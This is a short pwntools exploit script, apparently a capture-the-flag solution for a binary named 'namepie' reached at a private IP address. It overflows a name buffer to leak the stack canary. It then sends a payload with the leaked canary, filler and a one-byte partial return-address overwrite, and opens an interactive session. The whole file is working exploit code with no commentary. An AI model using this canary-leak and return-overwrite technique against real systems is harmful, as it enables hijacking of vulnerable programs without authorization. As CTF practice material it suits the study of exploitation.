from pwn import *
#p = process("./namepie")

p = remote("172.20.14.251",9999)
p.recvuntil("Name:")
p.sendline('a'*40)

p.recvuntil("\x0a")
p.recvuntil("\x0a")
canary = u64(p.recv(7).rjust(8,'\x00'))
print hex(canary)

p.recvuntil("sey!\n")
raw_input("#")
ebp = "A"*8
payload2 = 'a'*40 +p64(canary)+ebp+p8(0x71)
p.send(payload2)
p.interactive()
